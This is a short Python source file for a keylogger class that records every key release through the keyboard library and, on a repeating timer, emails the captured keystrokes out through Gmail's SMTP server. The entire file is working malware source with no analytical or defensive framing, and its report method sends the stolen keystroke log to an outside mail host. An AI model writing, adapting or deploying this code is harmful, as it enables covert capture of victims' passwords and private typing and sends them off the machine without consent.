import keyboard
import smtplib

from threading import Timer, Thread
from datetime import datetime


class Keylogger:
    def __init__(self, interval, email_addr, email_pw):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.email_addr = email_addr
        self.email_pw = email_pw

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            self.end_dt = datetime.now()
            message = "Subject: logs\n" + self.log
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(self.email_addr, self.email_pw)
            server.sendmail(self.email_addr, self.email_addr, message)
            server.quit()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        return Thread(target=keyboard.wait)




